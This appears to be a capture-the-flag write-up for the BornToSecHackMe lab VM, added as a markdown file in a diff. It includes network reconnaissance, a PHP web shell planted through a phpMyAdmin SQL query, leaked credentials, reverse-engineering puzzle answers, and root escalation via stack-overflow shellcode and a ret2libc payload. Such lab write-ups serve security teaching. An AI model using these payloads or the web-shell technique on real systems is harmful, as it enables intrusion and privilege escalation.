@@ -1,0 +1,503 @@
+# writeup1
+
+## laurie
+### Get access to laurie
+We have to find the ip address of the machine:
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap 192.168.1.*
+```
+
+```bash
+Nmap scan report for borntosechackme.home (192.168.1.37)
+Host is up (0.00013s latency).
+Not shown: 994 closed tcp ports (conn-refused)
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+143/tcp open  imap
+443/tcp open  https
+993/tcp open  imaps
+```
+
+or using msfconsole:
+```bash
+msf6 > db_nmap -sV -A -p 21,22,80,143,443,993 192.168.1.37
+[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 13:54 EST
+[*] Nmap: Nmap scan report for borntosechackme.home (192.168.1.37)
+[*] Nmap: Host is up (0.00023s latency).
+[*] Nmap: PORT    STATE SERVICE  VERSION
+[*] Nmap: 21/tcp  open  ftp      vsftpd 2.0.8 or later
+[*] Nmap: |_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
+[*] Nmap: 22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
+[*] Nmap: | ssh-hostkey:
+[*] Nmap: |   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
+[*] Nmap: |   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
+[*] Nmap: |_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
+[*] Nmap: 80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
+[*] Nmap: |_http-title: Hack me if you can
+[*] Nmap: |_http-server-header: Apache/2.2.22 (Ubuntu)
+[*] Nmap: 143/tcp open  imap     Dovecot imapd
+[*] Nmap: |_ssl-date: 2024-02-26T18:54:17+00:00; -1s from scanner time.
+[*] Nmap: | ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+[*] Nmap: | Not valid before: 2015-10-08T20:57:30
+[*] Nmap: |_Not valid after:  2025-10-07T20:57:30
+[*] Nmap: |_imap-capabilities: SASL-IR more capabilities IMAP4rev1 have Pre-login IDLE post-login listed LOGIN-REFERRALS OK LITERAL+ LOGINDISABLEDA0001 ENABLE ID STARTTLS
+[*] Nmap: 443/tcp open  ssl/http Apache httpd 2.2.22
+[*] Nmap: |_http-server-header: Apache/2.2.22 (Ubuntu)
+[*] Nmap: | ssl-cert: Subject: commonName=BornToSec
+[*] Nmap: | Not valid before: 2015-10-08T00:19:46
+[*] Nmap: |_Not valid after:  2025-10-05T00:19:46
+[*] Nmap: |_ssl-date: 2024-02-26T18:54:17+00:00; -1s from scanner time.
+[*] Nmap: |_http-title: 404 Not Found
+[*] Nmap: 993/tcp open  ssl/imap Dovecot imapd
+[*] Nmap: |_ssl-date: 2024-02-26T18:54:17+00:00; -1s from scanner time.
+[*] Nmap: |_imap-capabilities: SASL-IR capabilities IMAP4rev1 more Pre-login IDLE post-login have LOGIN-REFERRALS listed LITERAL+ OK ENABLE ID AUTH=PLAINA0001
+[*] Nmap: | ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+[*] Nmap: | Not valid before: 2015-10-08T20:57:30
+[*] Nmap: |_Not valid after:  2025-10-07T20:57:30
+[*] Nmap: Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[*] Nmap: Host script results:
+[*] Nmap: |_clock-skew: mean: -1s, deviation: 0s, median: -1s
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds
+msf6 >
+```
+
+We use dirb to list all interesting urls on the apache server:
+```bash
+dirb https://192.168.1.37
+...
+==> DIRECTORY: https://192.168.1.37/forum/
+==> DIRECTORY: https://192.168.1.37/phpmyadmin/
+==> DIRECTORY: https://192.168.1.37/webmail/
+...
+```
+
+We start by exploring the forum and we can see some user logs:
+on that url: `https://192.168.1.37/forum/index.php?id=6`
+If we look we have that line that looks like a password:
+`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`
+
+If we try to login with ssh it doesnt work. so we try on the forum with:
+username: `lmezard`
+password: `!q\]Ej?*5K5cy*AJ`
+It works. Then we look around in the settings and see that email: `laurie@borntosec.net`
+we try to login on `https://192.168.1.37/webmail`
+username: `laurie@borntosec.net`
+password: `!q\]Ej?*5K5cy*AJ`
+Boom we in:
+We look at the emails and we can see credentials for the database access:
+`You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$`
+
+We found that we can inject a command into phpmysql as sql query and it will create a file that can be query by the forum url:
+`SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/test.php"`
+
+If we dig a bit we find this file "LOOKATME" inside the home of laurie.
+`https://192.168.1.176/forum/templates_c/test.php?cmd=cat%20/home/LOOKATME/password`
+`lmezard:G!@M6f4Eatau{sF"`
+We try to connect with ssh but it doesnt work.
+We try the ftp:
+```bash
+└─$ ftp 192.168.1.41
+Connected to 192.168.1.41.
+220 Welcome on this server
+Name (192.168.1.41:kali): lmezard
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||25012|).
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+ftp> 
+```
+We get both files with the command `recv` and we try to solve the problem:
+```bash
+┌──(kali㉿kali)-[~]
+└─$ cat README 
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+```
+We see that the fun file is actually a tar/gz so we decompress it
+```bash
+tar -xvf fun
+...
+ft_fun/KIVAQ.pcap
+...
+```
+The we solve the little challenge:
+```c
+int main() {
+    printf("M");
+    printf("Y");
+    printf(" ");
+    printf("P");
+    printf("A");
+    printf("S");
+    printf("S");
+    printf("W");
+    printf("O");
+    printf("R");
+    printf("D");
+    printf(" ");
+    printf("I");
+    printf("S");
+    printf(":");
+    printf(" ");
+    printf("%c",getme1());
+    printf("%c",getme2());
+    printf("%c",getme3());
+    printf("%c",getme4());
+    printf("%c",getme5());
+    printf("%c",getme6());
+    printf("%c",getme7());
+    printf("%c",getme8());
+    printf("%c",getme9());
+    printf("%c",getme10());
+    printf("%c",getme11());
+    printf("%c",getme12());
+    printf("\n");
+    printf("Now SHA-256 it and submit");
+}
+```
+For each getmeX we find the next file (for getme5 we get file369):
+
+```bash
+┌──(kali㉿kali)-[/tmp/pma/ft_fun]
+└─$ cat * | grep -A 5 "getme" _
+0T16C.pcap:char getme4() {
+0T16C.pcap-
+0T16C.pcap-//file115
+--
+4KAOH.pcap:char getme5() {
+4KAOH.pcap-
+4KAOH.pcap-//file368
+--
+32O0M.pcap:char getme7() {
+32O0M.pcap-
+32O0M.pcap-//file736
+--
+91CD0.pcap:char getme6() {
+91CD0.pcap-
+91CD0.pcap-//file521
+--
+331ZU.pcap:char getme1() {
+331ZU.pcap-
+331ZU.pcap-//file5
+--
+B62N4.pcap:char getme3() {
+B62N4.pcap-
+B62N4.pcap-//file56
+--
+BJPCP.pcap:char getme8() {
+BJPCP.pcap- return 'w';
+BJPCP.pcap-}
+BJPCP.pcap-/_
+BJPCP.pcap-void useless() {
+BJPCP.pcap- printf("Hahahaha Got you!!!\n");
+--
+BJPCP.pcap:char getme9() {
+BJPCP.pcap- return 'n';
+BJPCP.pcap-}
+BJPCP.pcap-/_
+BJPCP.pcap-void useless() {
+BJPCP.pcap- printf("Hahahaha Got you!!!\n");
+--
+BJPCP.pcap:char getme10() {
+BJPCP.pcap- return 'a';
+BJPCP.pcap-}
+BJPCP.pcap-/_
+BJPCP.pcap-void useless() {
+BJPCP.pcap- printf("Hahahaha Got you!!!\n");
+--
+BJPCP.pcap:char getme11() {
+BJPCP.pcap- return 'g';
+BJPCP.pcap-}
+BJPCP.pcap-/_
+BJPCP.pcap-void useless() {
+BJPCP.pcap- printf("Hahahaha Got you!!!\n");
+--
+BJPCP.pcap:char getme12()
+BJPCP.pcap-{
+BJPCP.pcap- return 'e';
+BJPCP.pcap-}
+BJPCP.pcap-/_
+BJPCP.pcap-void useless() {
+--
+BJPCP.pcap: printf("%c",getme1(I));
+BJPCP.pcap: printf("%c",getme2(h));
+BJPCP.pcap: printf("%c",getme3(e));
+BJPCP.pcap: printf("%c",getme4(a));
+BJPCP.pcap: printf("%c",getme5(r));
+BJPCP.pcap: printf("%c",getme6(t));
+BJPCP.pcap: printf("%c",getme7(p));
+BJPCP.pcap: printf("%c",getme8(w));
+BJPCP.pcap: printf("%c",getme9(n));
+BJPCP.pcap: printf("%c",getme10(a));
+BJPCP.pcap: printf("%c",getme11(g));
+BJPCP.pcap: printf("%c",getme12(e));
+BJPCP.pcap- printf("\n");
+BJPCP.pcap- printf("Now SHA-256 it and submit");
+BJPCP.pcap-}
+BJPCP.pcap-/\*
+BJPCP.pcap-void useless() {
+--
+G7Y8I.pcap:char getme2() {
+G7Y8I.pcap-
+G7Y8I.pcap-//file37
+```
+
+pwd: `Iheartpwnage`
+
+```bash
+❯ echo -n "Iheartpwnage" | sha256sum
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
+```
+
+ssh password for laurie:
+`330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
+
+### Get access to thor:
+Now that we are connected with laurie we find a file called bomb and a README:
+```bash
+laurie@BornToSecHackMe:~$ ls
+bomb  README
+```bash
+laurie@BornToSecHackMe:~$ cat README 
+Diffuse this bomb!
+When you have all the password use it as "thor" user with ssh.
+
+HINT:
+P
+ 2
+ b
+
+o
+4
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+```
+
+We will defuse the bomb. (we decompile it using ghidra):
+- Phase 1:
+    - easy, password is `Public speaking is very easy.`
+- Phase 2:
+    - we reverse the algo: `1 2 6 24 120 720`
+- Phase 3:
+    - We wrote a little solver: see `scripts/writeup1/solver3.c` but that gets us: `2 b 755`
+- Phase 4:
+    - We bruteforce with a script that we re did ourselves and we found `9`
+- Phase 5:
+    - Same we bruteforce with a script. see `scripts/writeup1/solver5.c` that gets us multiple answers but we know the correct one is: `opekmq`
+- Phase 6:
+    - Here again... bruteforce: see `scripts/writeups1/solver6.py` that gets us following output: `4 2 6 3 1 5`
+
+We read from the subject that the last output is rather: `4 2 6 1 3 5`.
+
+Bomb steps:
+1. `Public speaking is very easy.`
+2. `1 2 6 24 120 720`
+3. `2 b 755`
+4. `9`
+5. `opekmq`
+6. `4 2 6 1 3 5`
+```
+So we assemble as given in the README and the hints:
+`Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+
+just in case:
+```bash
+for i in `echo 2b755 1b214 7b524`; do  for w in `echo opekma opekmq opukma opukmq`; do echo "Publicspeakingisveryeasy.12624120720${i}9${w}426135"; done; echo "\n"; done
+```
+
+## Thor
+We can now login to `thor`
+```bash
+laurie@BornToSecHackMe:~$ su thor
+Password: 
+thor@BornToSecHackMe:~$
+```
+
+We see that the `README` file says
+`Finish this challenge and use the result as password for 'zaz' user.`
+So we try to write two solver for that:
+the first one is `scripts/writeup1/thor/turtle_coord.py`
+But it doesnt work.
+so we try to write a second one this time plotting the results:
+`scripts/writeup1/thor/turtle_graph.py`
+We can see that it draws an image with pyplot which says `SLASH`
+then we try every algorithm to generate a hash and we finally find that md5sum works.
+```bash
+thor@BornToSecHackMe:~$ echo -n "SLASH" | md5sum
+646da671ca01bb5d84dbb5fb2238dc8e  -
+
+```
+
+## ZAZ
+We can now login to `zaz`:
+
+```bash
+thor@BornToSecHackMe:~$ su zaz
+Password: 
+zaz@BornToSecHackMe:~$ ls
+exploit_me  mail
+```
+
+if we decompile the binary with `ghidra` or `dogbolt` we immediatly see that we can do a `buffer overflow` exploit:
+and since the file is executed by root we guess that its the last step:
+```bash
+zaz@BornToSecHackMe:~$ ls -l
+total 5
+-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail
+```
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+```bash
+zaz@BornToSecHackMe:~$ gdb exploit_me                                                                                                                                                  
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04                                                                                                                             
+Copyright (C) 2012 Free Software Foundation, Inc.                                                                                                                                      
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>                                                                                                          
+This is free software: you are free to change and redistribute it.                                                                                                                     
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"                                                                                                             
+and "show warranty" for details.                                                                                                                                                       
+This GDB was configured as "i686-linux-gnu".                                                                                                                                           
+For bug reporting instructions, please see:                                                                                                                                            
+<http://bugs.launchpad.net/gdb-linaro/>...                                                                                                                                             
+Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.                                                                                                       
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag                                                                                                                                                            
+Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag                                                                                                                               
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag                                        
+Program received signal SIGSEGV, Segmentation fault.                                                                                                                                   
+0x37654136 in ?? ()                                                                                                                                                                    
+```
+
+=> Offset 140
+
+```bash
+zaz@BornToSecHackMe:~$ cat find.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+c
+int main(void) {
+  printf("ShellCode address: 0x%lx\n", getenv("SHELLCODE"));
+  return 0;
+}
+```
+
+```bash
+zaz@BornToSecHackMe:~$ cat inject.c 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define NOP 0x90
+
+char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
+                   "\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
+
+int main(void) {
+  char shell[4096];
+  puts("Shellcode loaded into environment.\n");
+  memset(shell, NOP, 4096);
+  memcpy(&shell[4096 - strlen(shellcode)], shellcode, strlen(shellcode));
+  setenv("SHELLCODE", shell, 1);
+  putenv(shell);
+  system("bash");
+
+  return 0;
+}
+```
+
+
+```bash
+zaz@BornToSecHackMe:~$ ./inject 
+Shellcode loaded into environment.
+
+zaz@BornToSecHackMe:~$ ./find 
+ShellCode address: 0xbfffe93f
+```
+
+```bash
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'import struct; print 140 * "A" + struct.pack("I", 0xbfffe93f)')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?���
+# whoami
+root
+```
+## Alternative with ret2libc
+
+```bash
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xb7e6b060  __libc_system
+0xb7e6b060  system
+0xb7f49550  svcerr_systemerr
+```
+
+```bash
+(gdb) info function exit
+All functions matching regular expression "exit":
+
+Non-debugging symbols:
+0xb7e5ebe0  exit
+0xb7e5ec10  on_exit
+0xb7e5ee20  __cxa_atexit
+0xb7e5efc0  quick_exit
+0xb7e5eff0  __cxa_at_quick_exit
+0xb7ee41d8  _exit
+0xb7f28500  pthread_exit
+0xb7f2dc10  __cyg_profile_func_exit
+0xb7f4c750  svc_exit
+0xb7f56c80  atexit
+```
+
+```bash
+(gdb) info proc map
+process 2823
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+        0xb7e2b000 0xb7e2c000     0x1000        0x0 
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd2000 0xb7fd5000     0x3000        0x0 
+        0xb7fdb000 0xb7fdd000     0x2000        0x0 
+        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+        0xbffde000 0xc0000000    0x22000        0x0 [stack]
+```
+
+```bash
+(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
+0xb7f8cc58
+1 pattern found.
+```
+
+```bash
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'import struct; print 140 * "A" + struct.pack("I", 0xb7e6b060) + struct.pack("I", 0xb7e5ebe0) + struct.pack("I", 0xb7f8cc58)')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?���
+# whoami
+root
+```
+
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'import struct; print 140 * "A" + struct.pack("I", 0xb7e6b060) + struct.pack("I", 0xb7e5ebe0) + struct.pack("I", 0xb7f8cc58)')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�������X���
+# whoami
+root
+
+Done.
